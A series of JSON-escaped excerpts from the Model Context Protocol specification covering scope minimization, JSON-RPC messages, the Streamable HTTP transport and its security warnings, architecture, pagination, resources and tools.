`stdio` transport to limit access to just the MCP client\n- Restrict access if using an HTTP transport, such as:\n  - Require an authorization token\n  - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access\n\n### Scope Minimization\n\nPoor scope design increases token compromise impact, elevates user friction, and obscures audit trails.\n\n#### Attack Description\n\nAn attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.\n\n#### Risks\n\n- Expanded blast radius: stolen broad token enables unrelated tool/resource access\n- Higher friction on revocation: revoking a max-privilege token disrupts all workflows\n- Audit noise: single omnibus scope masks user intent per operation\n- Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts\n- Consent abandonment: users decline dialogs listing excessive scopes\n- Scope inflation blindness: lack of metrics makes over-broad requests normalised\n\n#### Mitigation\n\nImplement a progressive, least-privilege scope model:\n\n- Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations\n- Incremental elevation via targeted `WWW-Authenticate` `scope=\"...\"` challenges when privileged operations are first attempted\n- Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes\n\nServer guidance:\n\n- Emit precise scope challenges; avoid returning the full catalog\n- Log elevation events (scope requested, granted subset) with correlation IDs\n\nClient guidance:\n\n- Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)\n- Cache recent failures to avoid repeated elevation loops for denied scopes\n\n#### Common Mistakes\n\n- Publishing all possible scopes in `scopes_supported`\n- Using wildcard or omnibus scopes (`*`, `all`, `full-access`)\n- Bundling unrelated privileges to preempt future prompts\n- Returning entire scope catalog in every challenge\n- Silent scope semantic changes without versioning\n- Treating claimed scopes in token as sufficient without server-side authorization logic\n\nProper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.\n"}

Other components **MAY** be implemented based on the specific needs of the\napplication.\n\nThese protocol layers establish clear separation of concerns while enabling rich\ninteractions between clients and servers. The modular design allows implementations to\nsupport exactly the features they need.\n\n## Messages\n\nAll messages between MCP clients and servers **MUST** follow the\n[JSON-RPC 2.0](https://www.jsonrpc.org/specification) specification. The protocol defines\nthese types of messages:\n\n### Requests\n\n[Requests](/specification/draft/schema#jsonrpcrequest) are sent from the client to the server or vice versa, to initiate an operation.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Requests **MUST** include a string or integer ID.\n- Unlike base JSON-RPC, the ID **MUST NOT** be `null`.\n- The request ID **MUST NOT** have been previously used by the requestor within the same\n  session.\n\n### Responses\n\nResponses are sent in reply to requests, containing either the result or error of the operation.\n\n#### Result Responses\n\n[Result responses](/specification/draft/schema#jsonrpcresultresponse) are sent when the operation completes successfully.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  result: {\n    [key: string]: unknown;\n  }\n}\n```\n\n- Result responses **MUST** include the same ID as the request they correspond to.\n- Result responses **MUST** include a `result` field.\n- The `result` **MAY** follow any JSON object structure.\n\n#### Error Responses\n\n[Error responses](/specification/draft/schema#jsonrpcerrorresponse) are sent when the operation fails or encounters an error.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id?: string | number;\n  error: {\n    code: number;\n    message: string;\n    data?: unknown;\n  }\n}\n```\n\n- Error responses **MUST** include the same ID as the request they correspond to (except in error cases where the ID could not be read due a malformed request).\n- Error responses **MUST** include an `error` field with a `code` and `message`.\n- Error codes **MUST** be integers.\n\n### Notifications\n\n[Notifications](/specification/draft/schema#jsonrpcnotification) are sent from the client to the server or vice versa, as a one-way message.\nThe receiver **MUST NOT** send a response.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Notifications **MUST NOT** include an ID.\n\n## Auth\n\nMCP provides an [Authorization](/specification/draft/basic/authorization) framework for use with HTTP.\nImplementations using an HTTP-based transport **SHOULD** conform to this specification,\nwhereas implementations using STDIO transport **SHOULD NOT** follow this specification,\nand instead retrieve credentials from the environment.\n\nAdditionally, clients and servers **MAY** negotiate their own custom authentication and\nauthorization strategies.\n\nFor further discussions and contributions to the evolution of MCP's auth mechanisms, join\nus in\n[GitHub Discussions](https://github.com/modelcontextprotocol/specification/discussions)\nto help shape the future of the protocol!\n\n## Schema\n\nThe full specification of the protocol is defined as a\n[TypeScript schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/draft/schema.ts).\nThis is the source of truth for all protocol messages and structures.\n\nThere is also a\n[JSON Schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/draft/schema.json),\nwhich is automatically generated from the TypeScript source of truth, for use with\nvarious automated tooling.\n\n## JSON Schema Usage\n\nThe Model Context Protocol uses JSON Schema for validation throughout the protocol. This section clarifies how JSON Schema should be used within MCP messages.\n\n### Schema Dialect\n\nMCP supports JSON Schema with the following rules:\n\n1. **Default dialect**: When a schema does not include a `$schema` field, it defaults to JSON Schema 2020-12 (`https://json-schema.org/draft/2020-12/schema`)\n1. **Explicit dialect**: Schemas MAY include a `$schema` field to specify a different dialect\n1. **Supported dialects**: Implementations MUST support at least 2020-12 and SHOULD document which additional dialects they support\n1. **Recommendation**: Implementors are RECOMMENDED to use JSON Schema 2020-12.\n\n### Example Usage\n\n#### Default dialect (2020-12):\n\n```json\n{\n  \"type\": \"object\",\n  \"properties\": {\n    \"name\": { \"type\": \"string\" },\n    \"age\": { \"type\": \"integer\", \"minimum\": 0 }\n  },\n  \"required\": [\"name\"]\n}\n```\n\n#### Explicit dialect (draft-07):\n\n```json\n{\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"name\": { \"type\": \"string\" },\n    \"age\": { \"type\": \"integer\", \"minimum\": 0 }\n  },\n  \"required\": [\"name\"]\n}\n```\n\n### Implementation Requirements\n\n- Clients and servers **MUST** support JSON Schema 2020-12 for schemas without an explicit `$schema` field\n- Clients and servers **MUST** validate schemas according to their declared or default dialect. They **MUST** handle unsupported dialects gracefully by returning an appropriate error indicating the dialect is not supported.\n- Clients and servers **SHOULD** document which schema dialects they support\n\n### Schema Validation\n\n- Schemas **MUST** be valid according to their declared or default dialect\n\n## General fields\n\n### `_meta`\n\nThe `_meta` property/parameter is reserved by MCP to allow clients and servers\nto attach additional metadata to their interactions.\n\nCertain key names are reserved by MCP for protocol-level metadata, as specified below;\nimplementations MUST NOT make assumptions about values at these keys.\n\nAdditionally, definitions in the [schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/draft/schema.ts)\nmay reserve particular names for purpose-specific metadata, as declared in those definitions.\n\n**Key name format:** valid `_meta` key names have two segments: an optional **prefix**, and a **name**.\n\n**Prefix:**\n\n- If specified, MUST be a series of labels separated by dots (`.`), followed by a slash (`/`).\n  - Labels MUST start with a letter and end with a letter or digit; interior characters can be letters, digits, or hyphens (`-`).\n  - Implementations SHOULD use reverse DNS notation (e.g., `com.example/` rather than `example.com/`).\n- Any prefix where the second label is `modelcontextprotocol` or `mcp` is **reserved** for MCP use.\n  - For example: `io.modelcontextprotocol/`, `dev.mcp/`, `org.modelcontextprotocol.api/`, and `com.mcp.tools/` are all reserved.\n  - However, `com.example.mcp/` is NOT reserved, as the second label is `example`.\n\n**Name:**\n\n- Unless empty, MUST begin and end with an alphanumeric character (`[a-z0-9A-Z]`).\n- MAY contain hyphens (`-`), underscores (`_`), dots (`.`), and alphanumerics in between.\n\n### `icons`\n\nThe `icons` property provides a standardized way for servers to expose visual identifiers for their resources, tools, prompts, and implementations. Icons enhance user interfaces by providing visual context and improving the discoverability of available functionality.\n\nIcons are represented as an array of `Icon` objects, where each icon includes:\n\n- `src`: A URI pointing to the icon resource (required). This can be:\n  - An HTTP/HTTPS URL pointing to an image file\n  - A data URI with base64-encoded image data\n- `mimeType`: Optional MIME type if the server's type is missing or generic\n- `sizes`: Optional array of size specifications (e.g., `[\"48x48\"]`, `[\"any\"]` for scalable formats like SVG, or `[\"48x48\", \"96x96\"]` for multiple sizes)\n\n**Required MIME type support:**\n\nClients that support rendering icons **MUST** support at least the following MIME types:\n\n- `image/png` - PNG images (safe, universal compatibility)\n- `image/jpeg` (and `image/jpg`) - JPEG images (safe, universal compatibility)\n\nClients that support rendering icons **SHOULD** also support:\n\n- `image/svg+xml` - SVG images (scalable but requires security precautions as noted below)\n- `image/webp` - WebP images (modern, efficient format)\n\n**Security considerations:**\n\nConsumers of icon metadata **MUST** take appropriate security precautions when handling icons to prevent compromise:\n\n- Treat icon metadata and icon bytes as untrusted inputs and defend against network, privacy, and parsing risks.\n- Ensure that the icon URI is either a HTTPS or `data:` URI. Clients **MUST** reject icon URIs that use unsafe schemes and redirects, such as `javascript:`, `file:`, `ftp:`, `ws:`, or local app URI schemes.\n  - Disallow scheme changes and redirects to hosts on different origins.\n- Be resilient against resource exhaustion attacks stemming from oversized images, large dimensions, or excessive frames (e.g., in GIFs).\n  - Consumers **MAY** set limits for image and content size.\n- Fetch icons without credentials. Do not send cookies, `Authorization` headers, or client credentials.\n- Verify that icon URIs are from the same origin as the server.

See the [backwards compatibility](#backwards-compatibility)\nguide below.\n\n</Info>\n\nIn the **Streamable HTTP** transport, the server operates as an independent process that\ncan handle multiple client connections. This transport uses HTTP POST and GET requests.\nServer can optionally make use of\n[Server-Sent Events](https://en.wikipedia.org/wiki/Server-sent_events) (SSE) to stream\nmultiple server messages. This permits basic MCP servers, as well as more feature-rich\nservers supporting streaming and server-to-client notifications and requests.\n\nThe server **MUST** provide a single HTTP endpoint path (hereafter referred to as the\n**MCP endpoint**) that supports both POST and GET methods. For example, this could be a\nURL like `https://example.com/mcp`.\n\n#### Security Warning\n\nWhen implementing Streamable HTTP transport:\n\n1. Servers **MUST** validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks\n   - If the `Origin` header is present and invalid, servers **MUST** respond with HTTP 403 Forbidden. The HTTP response\n     body **MAY** comprise a JSON-RPC _error response_ that has no `id`\n2. When running locally, servers **SHOULD** bind only to localhost (127.0.0.1) rather than all network interfaces (0.0.0.0)\n3. Servers **SHOULD** implement proper authentication for all connections\n\nWithout these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites.\n\n### Sending Messages to the Server\n\nEvery JSON-RPC message sent from the client **MUST** be a new HTTP POST request to the\nMCP endpoint.\n\n1. The client **MUST** use HTTP POST to send JSON-RPC messages to the MCP endpoint.\n2. The client **MUST** include an `Accept` header, listing both `application/json` and\n   `text/event-stream` as supported content types.\n3. The body of the POST request **MUST** be a single JSON-RPC _request_, _notification_, or _response_.\n4. If the input is a JSON-RPC _response_ or _notification_:\n   - If the server accepts the input, the server **MUST** return HTTP status code 202\n     Accepted with no body.\n   - If the server cannot accept the input, it **MUST** return an HTTP error status code\n     (e.g., 400 Bad Request). The HTTP response body **MAY** comprise a JSON-RPC _error\n     response_ that has no `id`.\n5. If the input is a JSON-RPC _request_, the server **MUST** either\n   return `Content-Type: text/event-stream`, to initiate an SSE stream, or\n   `Content-Type: application/json`, to return one JSON object. The client **MUST**\n   support both these cases.\n6. If the server initiates an SSE stream:\n   - The server **SHOULD** immediately send an SSE event consisting of an event\n     ID and an empty `data` field in order to prime the client to reconnect\n     (using that event ID as `Last-Event-ID`).\n   - After the server has sent an SSE event with an event ID to the client, the\n     server **MAY** close the _connection_ (without terminating the _SSE stream_)\n     at any time in order to avoid holding a long-lived connection. The client\n     **SHOULD** then \"poll\" the SSE stream by attempting to reconnect.\n   - If the server does close the _connection_ prior to terminating the _SSE stream_,\n     it **SHOULD** send an SSE event with a standard [`retry`](https://html.spec.whatwg.org/multipage/server-sent-events.html#:~:text=field%20name%20is%20%22retry%22) field before\n     closing the connection. The client **MUST** respect the `retry` field,\n     waiting the given number of milliseconds before attempting to reconnect.\n   - The SSE stream **SHOULD** eventually include a JSON-RPC _response_ for the\n     JSON-RPC _request_ sent in the POST body.\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ before sending the\n     JSON-RPC _response_. These messages **SHOULD** relate to the originating client\n     _request_.\n   - The server **MAY** terminate the SSE stream if the [session](#session-management)\n     expires.\n   - After the JSON-RPC _response_ has been sent, the server **SHOULD** terminate the\n     SSE stream.\n   - Disconnection **MAY** occur at any time (e.g., due to network conditions).\n     Therefore:\n     - Disconnection **SHOULD NOT** be interpreted as the client cancelling its request.\n     - To cancel, the client **SHOULD** explicitly send an MCP `CancelledNotification`.\n     - To avoid message loss due to disconnection, the server **MAY** make the stream\n       [resumable](#resumability-and-redelivery).\n\n### Listening for Messages from the Server\n\n1. The client **MAY** issue an HTTP GET to the MCP endpoint. This can be used to open an\n   SSE stream, allowing the server to communicate to the client, without the client first\n   sending data via HTTP POST.\n2. The client **MUST** include an `Accept` header, listing `text/event-stream` as a\n   supported content type.\n3. The server **MUST** either return `Content-Type: text/event-stream` in response to\n   this HTTP GET, or else return HTTP 405 Method Not Allowed, indicating that the server\n   does not offer an SSE stream at this endpoint.\n4. If the server initiates an SSE stream:\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ on the stream.\n   - These messages **SHOULD** be unrelated to any concurrently-running JSON-RPC\n     _request_ from the client.\n   - The server **MUST NOT** send a JSON-RPC _response_ on the stream **unless**\n     [resuming](#resumability-and-redelivery) a stream associated with a previous client\n     request.\n   - The server **MAY** close the SSE stream at any time.\n   - If the server closes the _connection_ without terminating the _stream_, it\n     **SHOULD** follow the same polling behavior as described for POST requests:\n     sending a `retry` field and allowing the client to reconnect.\n   - The client **MAY** close the SSE stream at any time.\n\n### Multiple Connections\n\n1. The client **MAY** remain connected to multiple SSE streams simultaneously.\n2. The server **MUST** send each of its JSON-RPC messages on only one of the connected\n   streams; that is, it **MUST NOT** broadcast the same message across multiple streams.\n   - The risk of message loss **MAY** be mitigated by making the stream\n     [resumable](#resumability-and-redelivery).\n\n### Resumability and Redelivery\n\nTo support resuming broken connections, and redelivering messages that might otherwise be\nlost:\n\n1. Servers **MAY** attach an `id` field to their SSE events, as described in the\n   [SSE standard](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation).\n   - If present, the ID **MUST** be globally unique across all streams within that\n     [session](#session-management)—or all streams with that specific client, if session\n     management is not in use.\n   - Event IDs **SHOULD** encode sufficient information to identify the originating\n     stream, enabling the server to correlate a `Last-Event-ID` to the correct stream.\n2. If the client wishes to resume after a disconnection (whether due to network failure\n   or server-initiated closure), it **SHOULD** issue an HTTP GET to the MCP endpoint,\n   and include the\n   [`Last-Event-ID`](https://html.spec.whatwg.org/multipage/server-sent-events.html#the-last-event-id-header)\n   header to indicate the last event ID it received.\n   - The server **MAY** use this header to replay messages that would have been sent\n     after the last event ID, _on the stream that was disconnected_, and to resume the\n     stream from that point.\n   - The server **MUST NOT** replay messages that would have been delivered on a\n     different stream.\n   - This mechanism applies regardless of how the original stream was initiated (via\n     POST or GET). Resumption is always via HTTP GET with `Last-Event-ID`.\n\nIn other words, these event IDs should be assigned by servers on a _per-stream_ basis, to\nact as a cursor within that particular stream.\n\n### Session Management\n\nAn MCP \"session\" consists of logically related interactions between a client and a\nserver, beginning with the [initialization phase](/specification/draft/basic/lifecycle). To support\nservers which want to establish stateful sessions:\n\n1. A server using the Streamable HTTP transport **MAY** assign a session ID at\n   initialization time, by including it in an `MCP-Session-Id` header on the HTTP\n   response containing the `InitializeResult`.\n   - The session ID **SHOULD** be globally unique and cryptographically secure (e.g., a\n     securely generated UUID, a JWT, or a cryptographic hash).\n   - The session ID **MUST** only contain visible ASCII characters (ranging from 0x21 to\n     0x7E).\n   - The client **MUST** handle the session ID in a secure manner, see [Session Hijacking mitigations](/specification/draft/basic/security_best_practices#session-hijacking) for more details.\n2. If an `MCP-Session-Id` is returned by the server during initialization, clients using\n   the Streamable HTTP transport **MUST** include it in the `MCP-Session-Id` header on\n   all of their subsequent HTTP requests.\n   - Servers that require a session ID **SHOULD** respond to requests without an\n     `MCP-Session-Id` header (other than initialization) with HTTP 400 Bad Request.\n3. The server **MAY** terminate the session at any time, after which it **MUST** respond\n   to requests containing that session ID with HTTP 404 Not Found.\n4. When a client receives HTTP 404 in response to a request containing an\n   `MCP-Session-Id`, it **MUST** start a new session by sending a new `InitializeRequest`\n   without a session ID attached.\n5. Clients that no longer need a particular session (e.g., because the user is leaving\n   the client application) **SHOULD** send an HTTP DELETE to the MCP endpoint with the\n   `MCP-Session-Id` header, to explicitly terminate the session.\n   - The server **MAY** respond to this request with HTTP 405 Method Not Allowed,\n     indicating that the server does not allow clients to terminate sessions.\n\n### Sequence Diagram\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    note over Client, Server: initialization\n\n    Client->>+Server: POST InitializeRequest\n    Server->>-Client: InitializeResponse<br>MCP-Session-Id: 1868a90c...\n\n    Client->>+Server: POST InitializedNotification<br>MCP-Session-Id: 1868a90c...\n    Server->>-Client: 202 Accepted\n\n    note over Client, Server: client requests\n    Client->>+Server: POST ... request ...<br>MCP-Session-Id: 1868a90c...\n\n    alt single HTTP response\n      Server->>Client: ... response ...\n    else server opens SSE stream\n      loop while connection remains open\n          Server-)Client: ...

SSE messages from server ...\n    end\n    deactivate Server\n\n```\n\n### Protocol Version Header\n\nIf using HTTP, the client **MUST** include the `MCP-Protocol-Version:\n<protocol-version>` HTTP header on all subsequent requests to the MCP\nserver, allowing the MCP server to respond based on the MCP protocol version.\n\nFor example: `MCP-Protocol-Version: 2025-06-18`\n\nThe protocol version sent by the client **SHOULD** be the one [negotiated during\ninitialization](/specification/draft/basic/lifecycle#version-negotiation).\n\nFor backwards compatibility, if the server does _not_ receive an `MCP-Protocol-Version`\nheader, and has no other way to identify the version - for example, by relying on the\nprotocol version negotiated during initialization - the server **SHOULD** assume protocol\nversion `2025-03-26`.\n\nIf the server receives a request with an invalid or unsupported\n`MCP-Protocol-Version`, it **MUST** respond with `400 Bad Request`.\n\n### Backwards Compatibility\n\nClients and servers can maintain backwards compatibility with the deprecated [HTTP+SSE\ntransport](/specification/2024-11-05/basic/transports#http-with-sse) (from\nprotocol version 2024-11-05) as follows:\n\n**Servers** wanting to support older clients should:\n\n- Continue to host both the SSE and POST endpoints of the old transport, alongside the\n  new \"MCP endpoint\" defined for the Streamable HTTP transport.\n  - It is also possible to combine the old POST endpoint and the new MCP endpoint, but\n    this may introduce unneeded complexity.\n\n**Clients** wanting to support older servers should:\n\n1. Accept an MCP server URL from the user, which may point to either a server using the\n   old transport or the new transport.\n2. Attempt to POST an `InitializeRequest` to the server URL, with an `Accept` header as\n   defined above:\n   - If it succeeds, the client can assume this is a server supporting the new Streamable\n     HTTP transport.\n   - If it fails with the following HTTP status codes \"400 Bad Request\", \"404 Not\n     Found\" or \"405 Method Not Allowed\":\n     - Issue a GET request to the server URL, expecting that this will open an SSE stream\n       and return an `endpoint` event as the first event.\n     - When the `endpoint` event arrives, the client can assume this is a server running\n       the old HTTP+SSE transport, and should use that transport for all subsequent\n       communication.\n\n## Custom Transports\n\nClients and servers **MAY** implement additional custom transport mechanisms to suit\ntheir specific needs. The protocol is transport-agnostic and can be implemented over any\ncommunication channel that supports bidirectional message exchange.\n\nImplementers who choose to support custom transports **MUST** ensure they preserve the\nJSON-RPC message format and lifecycle requirements defined by MCP. Custom transports\n**SHOULD** document their specific connection establishment and message exchange patterns\nto aid interoperability.\n"}

This architecture enables users to integrate AI\ncapabilities across applications while maintaining clear security boundaries and\nisolating concerns. Built on JSON-RPC, MCP provides a stateful session protocol focused\non context exchange and sampling coordination between clients and servers.\n\n## Core Components\n\n```mermaid\ngraph LR\n    subgraph \"Application Host Process\"\n        H[Host]\n        C1[Client 1]\n        C2[Client 2]\n        C3[Client 3]\n        H --> C1\n        H --> C2\n        H --> C3\n    end\n\n    subgraph \"Local machine\"\n        S1[Server 1<br>Files & Git]\n        S2[Server 2<br>Database]\n        R1[(\"Local<br>Resource A\")]\n        R2[(\"Local<br>Resource B\")]\n\n        C1 --> S1\n        C2 --> S2\n        S1 <--> R1\n        S2 <--> R2\n    end\n\n    subgraph \"Internet\"\n        S3[Server 3<br>External APIs]\n        R3[(\"Remote<br>Resource C\")]\n\n        C3 --> S3\n        S3 <--> R3\n    end\n```\n\n### Host\n\nThe host process acts as the container and coordinator:\n\n- Creates and manages multiple client instances\n- Controls client connection permissions and lifecycle\n- Enforces security policies and consent requirements\n- Handles user authorization decisions\n- Coordinates AI/LLM integration and sampling\n- Manages context aggregation across clients\n\n### Clients\n\nEach client is created by the host and maintains an isolated server connection:\n\n- Establishes one stateful session per server\n- Handles protocol negotiation and capability exchange\n- Routes protocol messages bidirectionally\n- Manages subscriptions and notifications\n- Maintains security boundaries between servers\n\nA host application creates and manages multiple clients, with each client having a 1:1\nrelationship with a particular server.\n\n### Servers\n\nServers provide specialized context and capabilities:\n\n- Expose resources, tools and prompts via MCP primitives\n- Operate independently with focused responsibilities\n- Request sampling through client interfaces\n- Must respect security constraints\n- Can be local processes or remote services\n\n## Design Principles\n\nMCP is built on several key design principles that inform its architecture and\nimplementation:\n\n1. **Servers should be extremely easy to build**\n   - Host applications handle complex orchestration responsibilities\n   - Servers focus on specific, well-defined capabilities\n   - Simple interfaces minimize implementation overhead\n   - Clear separation enables maintainable code\n\n2. **Servers should be highly composable**\n   - Each server provides focused functionality in isolation\n   - Multiple servers can be combined seamlessly\n   - Shared protocol enables interoperability\n   - Modular design supports extensibility\n\n3. **Servers should not be able to read the whole conversation, nor \"see into\" other\n   servers**\n   - Servers receive only necessary contextual information\n   - Full conversation history stays with the host\n   - Each server connection maintains isolation\n   - Cross-server interactions are controlled by the host\n   - Host process enforces security boundaries\n\n4. **Features can be added to servers and clients progressively**\n   - Core protocol provides minimal required functionality\n   - Additional capabilities can be negotiated as needed\n   - Servers and clients evolve independently\n   - Protocol designed for future extensibility\n   - Backwards compatibility is maintained\n\n## Capability Negotiation\n\nThe Model Context Protocol uses a capability-based negotiation system where clients and\nservers explicitly declare their supported features during initialization. Capabilities\ndetermine which protocol features and primitives are available during a session.\n\n- Servers declare capabilities like resource subscriptions, tool support, and prompt\n  templates\n- Clients declare capabilities like sampling support and notification handling\n- Both parties must respect declared capabilities throughout the session\n- Additional capabilities can be negotiated through extensions to the protocol\n\n```mermaid\nsequenceDiagram\n    participant Host\n    participant Client\n    participant Server\n\n    Host->>+Client: Initialize client\n    Client->>+Server: Initialize session with capabilities\n    Server-->>Client: Respond with supported capabilities\n\n    Note over Host,Server: Active Session with Negotiated Features\n\n    loop Client Requests\n        Host->>Client: User- or model-initiated action\n        Client->>Server: Request (tools/resources)\n        Server-->>Client: Response\n        Client-->>Host: Update UI or respond to model\n    end\n\n    loop Server Requests\n        Server->>Client: Request (sampling)\n        Client->>Host: Forward to AI\n        Host-->>Client: AI response\n        Client-->>Server: Response\n    end\n\n    loop Notifications\n        Server--)Client: Resource updates\n        Client--)Server: Status changes\n    end\n\n    Host->>Client: Terminate\n    Client->>-Server: End session\n    deactivate Server\n```\n\nEach capability unlocks specific protocol features for use during the session. For\nexample:\n\n- Implemented [server features](/specification/draft/server) must be advertised in the\n  server's capabilities\n- Emitting resource subscription notifications requires the server to declare\n  subscription support\n- Tool invocation requires the server to declare tool capabilities\n- [Sampling](/specification/draft/client) requires the client to declare support in its\n  capabilities\n\nThis capability negotiation ensures clients and servers have a clear understanding of\nsupported functionality while maintaining protocol extensibility.\n"}

Pagination allows servers to yield results in smaller chunks rather\nthan all at once.\n\nPagination is especially important when connecting to external services over the\ninternet, but also useful for local integrations to avoid performance issues with large\ndata sets.\n\n## Pagination Model\n\nPagination in MCP uses an opaque cursor-based approach, instead of numbered pages.\n\n- The **cursor** is an opaque string token, representing a position in the result set\n- **Page size** is determined by the server, and clients **MUST NOT** assume a fixed page\n  size\n\n## Response Format\n\nPagination starts when the server sends a **response** that includes:\n\n- The current page of results\n- An optional `nextCursor` field if more results exist\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"123\",\n  \"result\": {\n    \"resources\": [...],\n    \"nextCursor\": \"eyJwYWdlIjogM30=\"\n  }\n}\n```\n\n## Request Format\n\nAfter receiving a cursor, the client can _continue_ paginating by issuing a request\nincluding that cursor:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": \"124\",\n  \"method\": \"resources/list\",\n  \"params\": {\n    \"cursor\": \"eyJwYWdlIjogMn0=\"\n  }\n}\n```\n\n## Pagination Flow\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Client->>Server: List Request (no cursor)\n    loop Pagination Loop\n      Server-->>Client: Page of results + nextCursor\n      Client->>Server: List Request (with cursor)\n    end\n```\n\n## Operations Supporting Pagination\n\nThe following MCP operations support pagination:\n\n- `resources/list` - List available resources\n- `resources/templates/list` - List resource templates\n- `prompts/list` - List available prompts\n- `tools/list` - List available tools\n\n## Implementation Guidelines\n\n1.

This list not\nexhaustive&mdash;implementations are always free to use additional, custom URI schemes.\n\n### https://\n\nUsed to represent a resource available on the web.\n\nServers **SHOULD** use this scheme only when the client is able to fetch and load the\nresource directly from the web on its own—that is, it doesn’t need to read the resource\nvia the MCP server.\n\nFor other use cases, servers **SHOULD** prefer to use another URI scheme, or define a\ncustom one, even if the server will itself be downloading resource contents over the\ninternet.\n\n### file://\n\nUsed to identify resources that behave like a filesystem. However, the resources do not\nneed to map to an actual physical filesystem.\n\nMCP servers **MAY** identify file:// resources with an\n[XDG MIME type](https://specifications.freedesktop.org/shared-mime-info-spec/0.14/ar01s02.html#id-1.3.14),\nlike `inode/directory`, to represent non-regular files (such as directories) that don’t\notherwise have a standard MIME type.\n\n### git://\n\nGit version control integration.\n\n### Custom URI Schemes\n\nCustom URI schemes **MUST** be in accordance with [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986),\ntaking the above guidance in to account.\n\n## Error Handling\n\nServers **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Resource not found: `-32002`\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 5,\n  \"error\": {\n    \"code\": -32002,\n    \"message\": \"Resource not found\",\n    \"data\": {\n      \"uri\": \"file:///nonexistent.txt\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Servers **MUST** validate all resource URIs\n2. Access controls **SHOULD** be implemented for sensitive resources\n3. Binary data **MUST** be properly encoded\n4. Resource permissions **SHOULD** be checked before operations\n"}

Tools enable models to interact with external systems, such as querying\ndatabases, calling APIs, or performing computations. Each tool is uniquely identified by\na name and includes metadata describing its schema.\n\n## User Interaction Model\n\nTools in MCP are designed to be **model-controlled**, meaning that the language model can\ndiscover and invoke tools automatically based on its contextual understanding and the\nuser's prompts.\n\nHowever, implementations are free to expose tools through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n<Warning>\n\nFor trust & safety and security, there **SHOULD** always\nbe a human in the loop with the ability to deny tool invocations.\n\nApplications **SHOULD**:\n\n- Provide UI that makes clear which tools are being exposed to the AI model\n- Insert clear visual indicators when tools are invoked\n- Present confirmation prompts to the user for operations, to ensure a human is in the\n  loop\n\n</Warning>\n\n## Capabilities\n\nServers that support tools **MUST** declare the `tools` capability:\n\n```json\n{\n  \"capabilities\": {\n    \"tools\": {\n      \"listChanged\": true\n    }\n  }\n}\n```\n\n`listChanged` indicates whether the server will emit notifications when the list of\navailable tools changes.\n\n## Protocol Messages\n\n### Listing Tools\n\nTo discover available tools, clients send a `tools/list` request. This operation supports\n[pagination](/specification/draft/server/utilities/pagination).\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"tools/list\",\n  \"params\": {\n    \"cursor\": \"optional-cursor-value\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"tools\": [\n      {\n        \"name\": \"get_weather\",\n        \"title\": \"Weather Information Provider\",\n        \"description\": \"Get current weather information for a location\",\n        \"inputSchema\": {\n          \"type\": \"object\",\n          \"properties\": {\n            \"location\": {\n              \"type\": \"string\",\n              \"description\": \"City name or zip code\"\n            }\n          },\n          \"required\": [\"location\"]\n        },\n        \"icons\": [\n          {\n            \"src\": \"https://example.com/weather-icon.png\",\n            \"mimeType\": \"image/png\",\n            \"sizes\": [\"48x48\"]\n          }\n        ]\n      }\n    ],\n    \"nextCursor\": \"next-page-cursor\"\n  }\n}\n```\n\n### Calling Tools\n\nTo invoke a tool, clients send a `tools/call` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"get_weather\",\n    \"arguments\": {\n      \"location\": \"New York\"\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"Current weather in New York:\\nTemperature: 72°F\\nConditions: Partly cloudy\"\n      }\n    ],\n    \"isError\": false\n  }\n}\n```\n\n### List Changed Notification\n\nWhen the list of available tools changes, servers that declared the `listChanged`\ncapability **SHOULD** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/tools/list_changed\"\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant LLM\n    participant Client\n    participant Server\n\n    Note over Client,Server: Discovery\n    Client->>Server: tools/list\n    Server-->>Client: List of tools\n\n    Note over Client,LLM: Tool Selection\n    LLM->>Client: Select tool to use\n\n    Note over Client,Server: 